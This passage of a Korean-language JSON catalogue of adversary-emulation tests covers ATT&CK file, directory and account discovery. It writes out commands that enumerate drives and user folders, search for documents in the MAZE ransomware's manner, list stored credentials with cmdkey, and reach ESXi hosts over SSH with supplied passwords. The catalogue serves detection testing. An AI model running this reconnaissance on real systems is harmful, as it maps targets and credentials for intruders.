      "summary": "cmd.exe의 dir 및 tree 명령을 사용해 C:\\ 전체와 주요 사용자 디렉터리를 재귀적으로 열거하고, 결과를 하나의 출력 파일에 저장한다. 랜섬웨어나 정보수집형 악성코드의 초기 자산/파일 스캔 행위를 모사한다.",
      "procedure": [
        "결과를 기록할 출력 파일 경로(#{output_file})를 결정한다.",
        "C:\\ 루트, Program Files, Documents and Settings, Users, Recent, Desktop 등의 디렉터리에 대해 dir /s 명령을 실행한다.",
        "tree /F 명령을 통해 전체 디렉터리/파일 트리를 추가로 덤프한다.",
        "모든 결과를 동일한 출력 파일에 리다이렉션하여 저장한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "dir /s c:\\ >> #{output_file}\ndir /s \"c:\\Documents and Settings\" >> #{output_file}\ndir /s \"c:\\Program Files\\\" >> #{output_file}\ndir \"%systemdrive%\\Users\\*.*\" >> #{output_file}\ndir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> #{output_file}\ndir \"%userprofile%\\Desktop\\*.*\" >> #{output_file}\ntree /F >> #{output_file}"
        }
      ],
      "prerequisites": [
        "테스트를 실행하는 계정이 C:\\ 및 주요 사용자 디렉터리에 대해 읽기 권한을 가지고 있어야 한다.",
        "결과를 저장할 출력 파일 경로(예: %temp%\\T1083Test1.txt)에 쓰기 권한이 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%TEMP%\\T1083Test1.txt",
            "description": "dir/tree 명령 결과가 누적 저장된 파일 및 디렉터리 열거 로그"
          }
        ],
        "files_read": [
          {
            "path": "C:\\",
            "description": "루트 드라이브 및 하위 디렉터리 메타데이터(파일/폴더 목록)"
          },
          {
            "path": "%SYSTEMDRIVE%\\Users\\*.*",
            "description": "모든 사용자 프로필 하위 파일/폴더 목록"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "다수의 dir/tree 명령을 통해 파일 및 디렉터리를 열거하는 프로세스",
            "commandline_pattern": "dir /s * >> *"
          }
        ],
        "network": []
      },
      "cleanup": [
        "생성된 출력 파일(예: %temp%\\T1083Test1.txt)을 삭제해 디렉터리 열거 로그를 제거할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "0e36303b-6762-4500-b003-127743b80ba6"
      }
    },
    {
      "test_id": "T1083-2",
      "name": "File and Directory Discovery (PowerShell)",
      "platforms": [
        "windows"
      ],
      "summary": "PowerShell의 ls, Get-ChildItem, gci 명령을 재귀 옵션과 함께 실행해 현재 위치 기준으로 하위 디렉터리와 파일을 모두 열거한다. 별도의 파일 출력 없이 콘솔에 결과를 표시한다.",
      "procedure": [
        "PowerShell 세션을 시작한다.",
        "현재 디렉터리를 기준으로 ls -recurse를 실행해 모든 하위 파일/폴더를 나열한다.",
        "추가적으로 get-childitem -recurse 및 gci -recurse를 실행해 동일한 범위에 대해 반복 열거를 수행한다.",
        "콘솔 출력 또는 로깅을 통해 파일 및 디렉터리 구조를 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "ls -recurse\nget-childitem -recurse\ngci -recurse"
        }
      ],
      "prerequisites": [
        "테스트를 실행하는 계정이 현재 디렉터리 및 하위 디렉터리에 대한 읽기 권한을 가지고 있어야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [
          {
            "path": ". (현재 작업 디렉터리)",
            "description": "현재 디렉터리 및 모든 하위 디렉터리의 파일/폴더 메타데이터"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "재귀적인 Get-ChildItem/ls/gci 명령을 통해 파일 및 디렉터리를 탐색하는 프로세스",
            "commandline_pattern": "ls -recurse*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "별도의 아티팩트 파일이 생성되지 않으므로 추가적인 정리 작업은 필요하지 않다."
      ],
      "metadata": {
        "atomic_source_id": "2158908e-b7ef-4c21-8a83-3ce4dd05a924"
      }
    },
    {
      "test_id": "T1083-3",
      "name": "Simulating MAZE Directory Enumeration",
      "platforms": [
        "windows"
      ],
      "summary": "MAZE 랜섬웨어가 수행하는 디렉터리 열거 행위를 PowerShell로 모사한다. Program Files, Program Files (x86), 사용자 프로필 및 Desktop/Downloads/Documents/AppData 등 주요 사용자 폴더를 대상으로 재귀 열거를 수행하고 결과를 지정된 파일에 저장한다.",
      "procedure": [
        "출력 파일 경로(#{File_to_output}, 기본값: $env:temp\\T1083Test5.txt)를 설정한다.",
        "홈 드라이브 루트와 Program Files, Program Files(x86) 경로에 대해 Get-ChildItem을 실행하고 Out-File로 결과를 누적 기록한다.",
        "Users 폴더 내 각 사용자 하위 폴더에 대해 Desktop, Downloads, Documents, AppData/Local, AppData/Roaming 디렉터리를 순회하며 Get-ChildItem으로 파일/폴더를 열거한다.",
        "완료 후 cat 명령으로 출력 파일 내용을 콘솔에 표시한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$folderarray = @(\"Desktop\", \"Downloads\", \"Documents\", \"AppData/Local\", \"AppData/Roaming\")\nGet-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}\nGet-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append #{File_to_output}\nGet-ChildItem -Path \"${env:ProgramFiles(x86)}\" -erroraction silentlycontinue | Out-File -append #{File_to_output}\n$UsersFolder = \"$env:homedrive\\Users\\\"\nforeach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue)\n{\nforeach ($secondarydirectory in $folderarray)\n {Get-ChildItem -Path \"$UsersFolder/$directory/$secondarydirectory\" -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}}\n}\ncat #{File_to_output}"
        }
      ],
      "prerequisites": [
        "테스트를 실행하는 계정이 홈 드라이브, Program Files, Users 하위 디렉터리에 대한 읽기 권한을 가지고 있어야 한다.",
        "출력 파일이 생성될 $env:temp 경로에 쓰기 권한이 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%TEMP%\\T1083Test5.txt",
            "description": "MAZE 스타일 디렉터리 열거 결과가 누적된 텍스트 파일"
          }
        ],
        "files_read": [
          {
            "path": "%HOMEDRIVE%\\",
            "description": "홈 드라이브 루트 및 하위 디렉터리"
          },
          {
            "path": "%PROGRAMFILES%",
            "description": "Program Files 디렉터리 구조"
          },
          {
            "path": "%PROGRAMFILES(X86)%",
            "description": "32비트 Program Files 디렉터리 구조"
          },
          {
            "path": "%HOMEDRIVE%\\Users\\*",
            "description": "모든 사용자 폴더 및 주요 프로필 서브디렉터리(Desktop, Documents 등)"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "MAZE 랜섬웨어류에서 관찰되는 대규모 디렉터리 열거를 수행하는 PowerShell 프로세스",
            "commandline_pattern": "Get-ChildItem -Path $env:homedrive*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "출력 파일(예: %temp%\\T1083Test5.txt)을 Remove-Item으로 삭제해 디렉터리 열거 결과를 제거할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "c6c34f61-1c3e-40fb-8a58-d017d88286d8"
      }
    },
    {
      "test_id": "T1083-4",
      "name": "Launch DirLister Executable",
      "platforms": [
        "windows"
      ],
      "summary": "BlackCat 랜섬웨어에서 관찰된 DirLister.exe 도구 실행 행위를 모사한다. DirLister를 짧은 시간 실행한 뒤 프로세스를 종료해, 외부 디렉터리 열거 도구 사용 여부를 탐지·분석할 수 있게 한다.",
      "procedure": [
        "사전 조건으로 지정된 경로(#{dirlister_path})에 DirLister.exe가 존재하는지 확인한다.",
        "없을 경우 GitHub 릴리스를 다운로드하고 압축 해제 후 대상 경로로 복사한다.",
        "PowerShell에서 Start-Process를 사용해 DirLister.exe를 실행한다.",
        "일정 시간(예: 4초) 대기 후 Stop-Process -Name \"DirLister\"로 프로세스를 종료한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Start-Process \"#{dirlister_path}\"\nStart-Sleep -Second 4\nStop-Process -Name \"DirLister\""
        }
      ],
      "prerequisites": [
        "DirLister.exe가 지정된 경로(기본: PathToAtomicsFolder..\\ExternalPayloads\\DirLister.exe)에 존재해야 한다.",
        "존재하지 않을 경우 Atomic 테스트의 get_prereq 단계에서 GitHub 릴리스 파일을 다운로드할 수 있는 인터넷 연결이 필요하다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\DirLister.exe",
            "description": "사전 준비 단계에서 다운로드 및 배치된 DirLister 실행 파일"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "DirLister.exe",
            "description": "디렉터리 및 파일 목록을 생성하는 서드파티 유틸리티 프로세스",
            "commandline_pattern": "DirLister.exe*"
          }
        ],
        "network": [
          {
            "destination": "github.com (사전 준비 단계)",
            "description": "DirLister 바이너리 다운로드를 위한 HTTPS 트래픽"
          }
        ]
      },
      "cleanup": [
        "테스트 환경을 초기 상태로 복원하려면 ExternalPayloads 경로에 배치된 DirLister.exe 및 관련 디렉터리를 삭제할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "c5bec457-43c9-4a18-9a24-fe151d8971b7"
      }
    },
    {
      "test_id": "T1083-5",
      "name": "ESXi - Enumerate VMDKs available on an ESXi Host",
      "platforms": [
        "windows"
      ],
      "summary": "Windows 시스템에서 plink.exe(SSH 클라이언트)를 이용해 ESXi 호스트에 비대화형 SSH 접속을 수행하고, 사전에 정의된 스크립트(cli_script)를 통해 VMDK 파일을 포함한 ESXi 파일 시스템을 열거한다.",
      "procedure": [
        "사전 조건으로 plink.exe가 지정된 경로(#{plink_file})에 존재하는지 확인한다.",
        "필요 시 Atomic 테스트의 get_prereq 단계를 통해 plink.exe를 다운로드한다.",
        "Windows에서 plink.exe를 실행해 지정된 ESXi 호스트(vm_host)에 SSH로 접속한다.",
        "인증 정보(vm_user, vm_pass)를 사용해 로그인 후, cli_script에 정의된 파일 검색/열거 명령을 실행한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "echo \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{cli_script}\""
        }
      ],
      "prerequisites": [
        "ESXi 호스트에 SSH 접속이 허용되어 있어야 하며, vm_user/vm_pass 계정이 적절한 권한을 가져야 한다.",
        "지정된 경로에 plink.exe가 존재해야 하며, 없을 경우 인터넷을 통해 다운로드가 가능해야 한다.",
        "cli_script 경로에 ESXi에서 실행할 파일/디렉터리 열거 명령이 정의되어 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\T1083\\src\\esxi_file_discovery.txt",
            "description": "ESXi 호스트에서 실행될 파일/디렉터리 열거 명령이 포함된 스크립트 파일"
          },
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe",
            "description": "사전 준비 단계에서 다운로드된 plink SSH 클라이언트"
          }
        ],
        "files_read": [
          {
            "path": "/ (ESXi 호스트의 파일 시스템, 원격)",
            "description": "ESXi 상의 VMDK 및 관련 디렉터리 구조(원격 시스템 관점의 파일 메타데이터)"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "plink.exe",
            "description": "원격 ESXi 호스트에 SSH 접속해 파일/디렉터리 열거 스크립트를 실행하는 프로세스",
            "commandline_pattern": "plink.exe * -ssh -l * -pw * -m *"
          }
        ],
        "network": [
          {
            "destination": "#{vm_host}:22",
            "description": "Windows 클라이언트에서 ESXi 호스트로의 SSH 연결"
          }
        ]
      },
      "cleanup": [
        "테스트 후 필요하다면 plink.exe 및 esxi_file_discovery.txt 파일을 삭제해 SSH 도구 및 명령 스크립트 흔적을 제거할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "4a233a40-caf7-4cf1-890a-c6331bbc72cf"
      }
    },
    {
      "test_id": "T1083-6",
      "name": "Recursive Enumerate Files And Directories By Powershell",
      "platforms": [
        "windows"
      ],
      "summary": "사용자 프로필 하위의 Documents, Downloads, Desktop, OneDrive 등 일반적으로 민감한 문서가 저장되는 폴더를 대상으로, 특정 확장자(.pdf, .docx, .zip 등)의 파일을 재귀적으로 검색한다. 결과는 크기, 수정 시간과 함께 하나의 로그 파일에 저장된다.",
      "procedure": [
        "출력 파일 경로(#{output_file}, 기본값: $env:TEMP\\T1083-Enumerate-net.txt)를 설정한다.",
        "관심 디렉터리 목록(Documents, Downloads, Desktop, OneDrive)과 대상 확장자 목록(.pdf, .docx 등)을 정의한다.",
        "사용자 프로필 하위 디렉터리를 순회하며, 대상 디렉터리 이름이 포함된 경로에 대해서만 파일을 재귀적으로 열거한다.",
        "확장자와 일치하는 파일에 대해 경로, 크기, 마지막 수정 시간을 문자열로 기록한다.",
        "권한 부족/오류 발생 시 해당 경로와 에러 유형을 태그(AccessDenied, Error)와 함께 결과 리스트에 추가한다.",
        "최종적으로 결과 리스트를 출력 파일에 UTF-8 인코딩으로 저장한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$out = \"#{output_file}\"\n$dirsFilter = @('Documents','Downloads','Desktop','OneDrive')\n$exts = @('.pdf','.doc','.docx','.xls','.xlsx','.txt','.zip','.rar','.7z')\n$userProfile = [Environment]::GetFolderPath('UserProfile')\n$tr = [System.Collections.Generic.List[string]]::new()\n\nfunction MatchesExtension($path) {\n  try {\n    $e = [System.IO.Path]::GetExtension($path).ToLower()\n    return $exts -contains $e\n  } catch { return $false }\n}\n\nfunction Scan-Dir($root) {\n  try {\n    $match = $false\n    foreach ($f in $dirsFilter) { if ($root -like \"*$f*\") { $match = $true; break } }\n    if (-not $match) { return }\n\n    [System.IO.Directory]::EnumerateFiles($root) | ForEach-Object {\n      if (MatchesExtension $_) {\n        $fi = [System.IO.FileInfo]::new($_)\n        $tr.Add(\"[File] $_ Size:$($fi.Length) LastWrite:$($fi.LastWriteTime)\")\n      }\n    }\n\n    [System.IO.Directory]::EnumerateDirectories($root) | ForEach-Object {\n      Scan-Dir $_\n    }\n  } catch [System.UnauthorizedAccessException] {\n    $tr.Add(\"[AccessDenied] $root\")\n  } catch {\n    $tr.Add(\"[Error] $root => $($_.Exception.Message)\")\n  }\n}\n\n[System.IO.Directory]::EnumerateDirectories($userProfile) | ForEach-Object { Scan-Dir $_ }\n\n$outDir = [System.IO.Path]::GetDirectoryName($out)\nif (-not [string]::IsNullOrEmpty($outDir) -and -not (Test-Path $outDir)) {\n  New-Item -Path $outDir -ItemType Directory -Force | Out-Null\n}\n\n$tr | Out-File -FilePath $out -Encoding UTF8\nWrite-Output \"Enumeration complete. Results written to: $out\""
        }
      ],
      "prerequisites": [
        "테스트를 실행하는 계정이 사용자 프로필 및 하위 Documents/Downloads/Desktop/OneDrive 디렉터리에 대한 읽기 권한을 가져야 한다.",
        "출력 파일이 생성될 $env:TEMP 경로에 쓰기 권한이 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%TEMP%\\T1083-Enumerate-net.txt",
            "description": "대상 확장자 파일 목록, 크기, 마지막 수정 시간이 기록된 파일 검색 결과 로그"
          }
        ],
        "files_read": [
          {
            "path": "%USERPROFILE%\\Documents, Downloads, Desktop, OneDrive 하위",
            "description": "사용자 문서/다운로드/바탕화면/OneDrive 디렉터리 내의 파일 메타데이터 및 경로"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "특정 확장자를 가진 문서/압축 파일을 사용자 영역에서 선별적으로 열거하는 PowerShell 스크립트",
            "commandline_pattern": "T1083-Enumerate-net.txt"
          }
        ],
        "network": []
      },
      "cleanup": [
        "출력 파일(예: %TEMP%\\T1083-Enumerate-net.txt)을 삭제해 민감 파일 검색 결과를 제거할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "95a21323-770d-434c-80cd-6f6fbf7af432"
      }
    }
  ]
},
{
  "technique_id": "T1087.001",
  "technique_name": "Account Discovery: Local Account",
  "tactic": "Discovery",
  "description": "이 ATT&CK 기법은 로컬 시스템에 존재하는 사용자 계정과 그룹 정보를 열거하는 행위를 의미한다. 공격자는 현재/과거 로그인 사용자, 일반/관리자 계정, 저장된 자격 증명 등을 파악해 추가 공격 경로를 탐색한다. Windows에서는 net, PowerShell, 쿼리 도구, 원격 관리 도구 등을 활용해 계정·그룹·세션 정보를 수집하는 것이 특징이다.",
  "tests": [
    {
      "test_id": "T1087.001-1",
      "name": "Enumerate all accounts on Windows (Local)",
      "platforms": [
        "windows"
      ],
      "summary": "net 명령과 cmdkey, C:\\Users 디렉터리 열거를 통해 로컬 계정 목록, 사용자 프로필 디렉터리, 저장된 자격 증명, 로컬 그룹 정보를 한 번에 수집한다. 권한 상승이나 추가 피벗을 위한 계정·그룹 구조 파악 행동을 모사한다.",
      "procedure": [
        "cmd.exe 세션에서 net user를 실행해 로컬 사용자 계정 목록을 확인한다.",
        "C:\\Users\\ 디렉터리를 dir 명령으로 열거해 실제 사용자 프로필 폴더를 확인한다.",
        "cmdkey.exe /list를 통해 저장된 자격 증명(저장된 크리덴셜)을 열거한다.",
        "net localgroup \"Users\" 명령으로 Users 그룹 구성원을 조회한다.",
        "net localgroup 명령으로 로컬 시스템의 전체 그룹 목록을 확인한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "net user\ndir c:\\Users\\\ncmdkey.exe /list\nnet localgroup \"Users\"\nnet localgroup"
        }
      ],
      "prerequisites": [
        "테스트를 실행하는 계정이 net, cmdkey, dir 명령을 실행할 수 있어야 한다.",
        "C:\\Users\\ 디렉터리에 대한 읽기 권한이 있어야 한다.",
        "일부 정보(저장된 자격 증명)는 현재 사용자 또는 관리자 권한에 따라 표시 범위가 제한될 수 있다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [
          {
            "path": "C:\\Users\\",
            "description": "로컬 사용자 프로필 디렉터리 목록"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "net, cmdkey, dir 명령을 통해 계정 및 사용자 디렉터리를 열거하는 명령 프롬프트 프로세스",
            "commandline_pattern": "net user && dir C:\\Users\\ && cmdkey.exe /list && net localgroup*"
          },
          {
            "name": "net.exe",
            "description": "로컬 사용자 및 그룹 정보를 질의하는 유틸리티 프로세스",
            "commandline_pattern": "net user*"
          },
          {
            "name": "cmdkey.exe",
            "description": "저장된 자격 증명을 나열하는 프로세스",
            "commandline_pattern": "cmdkey.exe /list"
          }
        ],
        "network": []
      },
      "cleanup": [
        "추가적인 파일 아티팩트를 생성하지 않으므로 별도의 정리 작업은 필요하지 않다."
      ],
      "metadata": {
        "atomic_source_id": "80887bec-5a9b-4efc-a81d-f83eb2eb32ab"
      }
    },
    {
      "test_id": "T1087.001-2",
      "name": "Enumerate all accounts via PowerShell (Local)",
      "platforms": [
        "windows"
      ],
      "summary": "PowerShell과 net, cmdkey, 파일 시스템 열거를 조합해 로컬 사용자 계정, 그룹, 그룹 구성원, 저장된 자격 증명, 사용자 프로필 디렉터리를 폭넓게 수집한다. 계정 구조 및 권한 관계를 상세히 파악하는 탐색 행위를 시뮬레이션한다.",
      "procedure": [
        "PowerShell 세션에서 net user를 실행해 로컬 사용자 계정 목록을 확인한다.",
        "get-localuser를 사용해 로컬 사용자 계정의 상세 정보를 확인한다.",
        "get-localgroupmember -group Users로 Users 그룹 멤버를 열거한다.",
        "cmdkey.exe /list로 저장된 자격 증명을 확인한다.",
        "ls/get-childitem/dir 명령으로 C:\\Users\\ 디렉터리 및 하위 폴더를 열거한다.",
        "get-localgroup와 net localgroup으로 로컬 그룹 목록을 중복 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "net user\nget-localuser\nget-localgroupmember -group Users\ncmdkey.exe /list\nls C:/Users\nget-childitem C:\\Users\\\ndir C:\\Users\\\nget-localgroup\nnet localgroup"
        }
      ],
      "prerequisites": [
        "PowerShell이 사용 가능해야 하며, get-localuser / get-localgroup / get-localgroupmember cmdlet이 지원되는 Windows 버전이어야 한다.",
        "C:\\Users\\ 경로에 대한 읽기 권한이 있어야 하며, cmdkey.exe 실행 권한이 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [
          {
            "path": "C:\\Users\\",
            "description": "로컬 사용자 프로필 디렉터리 구조"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "net 및 다양한 PowerShell cmdlet을 사용해 사용자/그룹/저장된 자격 증명을 열거하는 프로세스",
            "commandline_pattern": "net user; get-localuser; get-localgroupmember -group Users; cmdkey.exe /list; *C:\\Users\\*"
          },
          {
            "name": "cmdkey.exe",
            "description": "저장된 자격 증명 목록을 조회하는 보안 관련 유틸리티",
            "commandline_pattern": "cmdkey.exe /list"
          }
        ],
        "network": []
      },
      "cleanup": [
        "결과를 별도 파일로 저장하지 않으므로 추가적인 클린업 작업은 필요하지 않다. 콘솔 히스토리 제거가 필요하다면 PowerShell 명령 히스토리를 수동으로 정리할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "ae4b6361-b5f8-46cb-a3f9-9cf108ccfe7b"
      }
    },
    {
      "test_id": "T1087.001-3",
      "name": "Enumerate logged on users via CMD (Local)",
      "platforms": [
        "windows"
      ],
      "summary": "query user 명령을 사용해 현재 시스템에 로그인한 사용자 세션을 열거한다. 터미널 세션, RDP 세션 등 활성/비활성 사용자 세션 정보를 확인하는 활동을 모사한다.",
      "procedure": [
        "cmd.exe 세션을 연다.",
        "query user 명령을 실행해 현재 로그인된 사용자 세션 목록을 조회한다.",
        "출력 결과의 사용자 이름, 세션 이름, ID, 상태(Active/Disc) 및 로그인 시간 정보를 확인한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "query user"
        }
      ],
      "prerequisites": [
        "터미널 서비스가 활성화된 Windows 환경이어야 하며, query user 명령 사용이 허용되어야 한다.",
        "일부 환경에서는 관리자 권한이 없으면 전체 세션 목록이 보이지 않을 수 있다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "query user 명령을 실행해 현재 로그인된 사용자 세션을 열거하는 명령 프롬프트 프로세스",
            "commandline_pattern": "query user"
          },
          {
            "name": "query.exe",
            "description": "세션 정보를 조회하는 시스템 유틸리티",
            "commandline_pattern": "query user"
          }
        ],
        "network": []
      },
      "cleanup": [
        "추가적인 파일이나 레지스트리 변경이 없으므로 클린업 단계는 필요하지 않다."
      ],
      "metadata": {
        "atomic_source_id": "a138085e-bfe5-46ba-a242-74a6fb884af3"
      }
    },
    {
      "test_id": "T1087.001-4",
      "name": "ESXi - Local Account Discovery via ESXCLI",
      "platforms": [
        "windows"
      ],
      "summary": "Windows 시스템에서 plink.exe를 사용해 ESXi 서버에 SSH로 접속하고, esxcli system account list 명령을 실행해 원격 ESXi 호스트의 로컬 계정 목록을 열거한다. 하이퍼바이저 계정 정보를 파악해 추가 공격에 활용할 수 있는 시나리오를 모사한다.",
      "procedure": [
        "사전 단계에서 지정된 경로(#{plink_file})에 plink.exe가 존재하는지 확인한다.",
        "존재하지 않을 경우 Atomic 테스트의 get_prereq 명령을 통해 인터넷에서 plink.exe를 다운로드하고, ExternalPayloads 디렉터리에 저장한다.",
        "cmd.exe 또는 PowerShell에서 echo \"\" | plink 명령을 실행해 지정된 ESXi 호스트(vm_host)에 SSH로 비대화형 접속을 시도한다.",
        "vm_user/vm_pass 계정으로 로그인 후, 원격에서 esxcli system account list 명령을 실행해 ESXi의 로컬 계정 목록을 출력한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "echo \"\" | \"#{plink_file}\" -batch \"#{vm_host}\" -ssh -l #{vm_user} -pw \"#{vm_pass}\" \"esxcli system account list\""
        }
      ],
      "prerequisites": [
        "Windows 시스템에서 plink.exe가 지정된 경로(기본: PathToAtomicsFolder..\\ExternalPayloads\\plink.exe)에 존재해야 한다.",
        "ESXi 호스트(vm_host)에서 SSH 서비스가 활성화되어 있어야 하며, vm_user 계정이 esxcli system account list를 실행할 수 있는 권한을 가져야 한다.",
        "plink.exe 다운로드를 위해 외부 인터넷 접속(https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe)이 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe",
            "description": "사전 준비 단계에서 다운로드된 PuTTY 기반 plink SSH 클라이언트"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "plink.exe",
            "description": "ESXi 호스트에 SSH로 접속해 esxcli system account list를 실행하는 비대화형 SSH 클라이언트 프로세스",
            "commandline_pattern": "plink.exe -batch * -ssh -l * -pw * \"esxcli system account list\""
          }
        ],
        "network": [
          {
            "destination": "#{vm_host}:22",
            "description": "Windows 클라이언트에서 ESXi 호스트로의 SSH 연결 (로컬 계정 열거 명령 전달)"
          }
        ]
      },
      "cleanup": [
        "테스트 후 환경을 정리하려면 ExternalPayloads 디렉터리 내 plink.exe를 삭제할 수 있다.",
        "ESXi 측에서는 별도의 파일 아티팩트가 남지 않지만, 필요한 경우 SSH 접속 로그를 점검 및 정리할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "9762ac6e-aa60-4449-a2f0-cbbd0e1fd22c"
      }
    }
  ]
},
{
  "technique_id": "T1087.002",
  "technique_name": "Account Discovery: Domain Account",
  "tactic": "Discovery",
  "description": "이 ATT&CK 기법은 도메인 환경에서 사용자·그룹·컴퓨터 계정 등 AD(Active Directory) 객체를 열거하는 행위를 의미한다. 공격자는 도메인 관리자, 특권 계정, 비밀번호 정책, 위임 설정, LAPS 속성 등 보안에 중요한 정보를 수집해 추가 공격 경로를 설계한다. net/PowerShell/AdFind/kerbrute/PowerView/ADSISearcher 등 다양한 도메인 도구와 LDAP 쿼리가 사용된다.",
  "tests": [
    {
      "test_id": "T1087.002-1",
      "name": "Enumerate all accounts (Domain)",
      "platforms": ["windows"],
      "summary": "net 도구를 사용해 도메인 사용자와 도메인 그룹을 열거한다. 도메인 가입 시스템에서 간단한 두 개의 명령으로 전체 사용자·그룹 구조를 파악하는 기본 정찰 행위를 시뮬레이션한다.",
      "procedure": [
        "cmd.exe 세션을 연다.",
        "net user /domain 명령으로 도메인 사용자 계정 목록을 열거한다.",
        "net group /domain 명령으로 도메인 그룹 목록을 열거한다.",
        "결과를 통해 관리자/서비스/일반 사용자 그룹 구성을 분석한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "net user /domain\nnet group /domain"
        }
      ],
      "prerequisites": [
        "호스트가 도메인에 조인(join)되어 있어야 한다.",
        "테스트를 실행하는 계정이 도메인 컨트롤러와 통신할 수 있어야 한다(네트워크/방화벽 허용)."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "도메인 사용자 및 그룹 열거를 수행하는 명령 프롬프트 프로세스",
            "commandline_pattern": "net user /domain && net group /domain"
          },
          {
            "name": "net.exe",
            "description": "도메인 계정 정보를 쿼리하는 Windows 네트워크 유틸리티",
            "commandline_pattern": "net user /domain"
          }
        ],
        "network": [
          {
            "destination": "도메인 컨트롤러(로그온 서버) TCP/UDP 445, 135 등",
            "description": "net user /domain, net group /domain 실행 시 도메인 컨트롤러와의 도메인 쿼리 트래픽"
          }
        ]
      },
      "cleanup": [
        "추가 파일이 생성되지 않으므로 별도의 클린업은 필요 없다."
      ],
      "metadata": {
        "atomic_source_id": "6fbc9e68-5ad7-444a-bd11-8bf3136c477e"
      }
    },
    {
      "test_id": "T1087.002-2",
      "name": "Enumerate all accounts via PowerShell (Domain)",
      "platforms": ["windows"],
      "summary": "PowerShell과 net, get-localgroupmember, get-aduser를 활용해 도메인 사용자, 로컬 그룹 멤버, AD 사용자 객체를 대량으로 열거한다. 도메인·로컬 계정 구조를 종합적으로 파악하는 시나리오를 시뮬레이션한다.",
      "procedure": [
        "PowerShell 세션을 시작한다.",
        "net user /domain 명령으로 도메인 사용자 계정 목록을 조회한다.",
        "get-localgroupmember -group Users로 로컬 Users 그룹 구성원을 확인한다.",
        "get-aduser -filter * 명령을 통해 도메인 전체 AD 사용자 객체를 열거한다(AD 모듈 필요)."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "net user /domain\nget-localgroupmember -group Users\nget-aduser -filter *"
        }
      ],
      "prerequisites": [
        "호스트가 도메인에 조인되어 있어야 한다.",
        "PowerShell ActiveDirectory 모듈이 설치되어 있어야 하며, get-aduser cmdlet 사용이 가능해야 한다.",
        "도메인 사용자 정보를 조회할 수 있는 적절한 권한을 가져야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "net 및 AD cmdlet을 사용하여 도메인/로컬 계정을 열거하는 PowerShell 프로세스",
            "commandline_pattern": "net user /domain; get-localgroupmember -group Users; get-aduser -filter *"
          }
        ],
        "network": [
          {
            "destination": "도메인 컨트롤러 LDAP/LDAPS",
            "description": "get-aduser 실행 시 발생하는 LDAP/LDAPS 쿼리 트래픽"
          }
        ]
      },
      "cleanup": [
        "콘솔 출력만 생성되므로 별도의 정리 작업은 필요 없다."
      ],
      "metadata": {
        "atomic_source_id": "8b8a6449-be98-4f42-afd2-dedddc7453b2"
      }
    },
    {
      "test_id": "T1087.002-3",
      "name": "Enumerate logged on users via CMD (Domain)",
      "platforms": ["windows"],
